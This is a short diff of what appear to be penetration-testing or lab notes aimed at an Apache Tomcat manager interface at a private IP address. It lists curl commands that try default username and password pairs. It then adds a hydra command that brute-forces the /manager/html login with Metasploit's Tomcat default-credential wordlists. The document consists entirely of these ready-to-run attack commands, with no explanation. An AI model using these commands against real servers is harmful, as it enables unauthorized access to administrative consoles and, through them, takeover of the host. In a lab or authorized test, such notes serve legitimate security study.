@@ -2,3 +2,8 @@ curl -u tomcat:s3cret http://172.17.17.118:8080/manager/html
 curl -u tomcat:tomcat http://172.17.17.118:8080/manager/html
 curl -u admin:admin http://172.17.17.118:8080/manager/html
 curl -u admin:s3cret http://172.17.17.118:8080/manager/html
+
+
+hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
+-P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt \
+172.17.17.118 http-get /manager/html
